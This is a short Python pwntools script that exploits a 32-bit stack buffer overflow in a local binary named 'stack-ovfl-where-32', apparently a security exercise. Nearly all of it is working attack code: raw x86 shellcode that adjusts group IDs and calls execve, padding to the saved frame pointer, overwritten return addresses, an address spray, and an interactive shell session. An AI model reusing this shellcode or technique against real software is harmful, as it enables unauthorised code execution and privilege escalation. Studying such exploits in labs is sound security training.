#!/usr/bin/env python

from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

filename = './stack-ovfl-where-32'

# [ ret addr ]
# [ ebp ]
# [ ebp - 4]
# [ ebp - 8]
# [ ebp - c]
# [ ebp - 10]
# [ ebp - 14]
# [ ebp - 18]
# [ ebp - 1c]
# [ ebp - 20]
# [ ebp - 24]
#       <---- ebp - 0x26
# [ ebp - 28]
# [ ebp - 2c]
# [ ebp - 30]

shellcode = p32(0xffffc4e2 + 0x4)
shellcode += 'j2X\xcd\x80\x89\xc3\x89\xc1jGX\xcd\x801\xc91\xd2j\x0bX1\xf6VjA\x89\xe3\xcd\x80'

shellcode +=  'A' * (0x26 - len(shellcode))
shellcode += p32(0xffffc518)
shellcode += p32(0x804857d)
shellcode += p32(0xffffc4e2 + 4) * 200
# shellcode += "B" * 200

p = process(filename)

# gdb.attach(p)

p.sendline(shellcode)


p.interactive()
